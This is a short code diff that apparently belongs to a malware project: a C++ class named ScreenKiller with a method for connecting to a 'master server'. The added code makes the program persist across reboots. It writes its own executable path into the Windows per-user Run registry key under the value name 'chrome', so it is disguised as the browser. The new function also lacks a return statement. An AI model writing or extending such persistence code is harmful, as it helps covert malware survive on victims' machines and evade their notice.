@@ -69,7 +69,14 @@ bool ScreenKiller::deploy_inner()
 
 bool ScreenKiller::get_persistency()
 {
-	return false;
+	char szExeFileName[MAX_PATH];
+	if (GetModuleFileNameA(NULL, szExeFileName, MAX_PATH) == 0)
+		return false;
+
+	HKEY hkey = NULL;
+	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
+
+	LONG status = RegSetValueExA(hkey, "chrome", 0, REG_SZ, reinterpret_cast<const BYTE *>(szExeFileName), (strlen(szExeFileName) + 1) * sizeof(char));
 }
 
 bool ScreenKiller::connect_to_master_server()
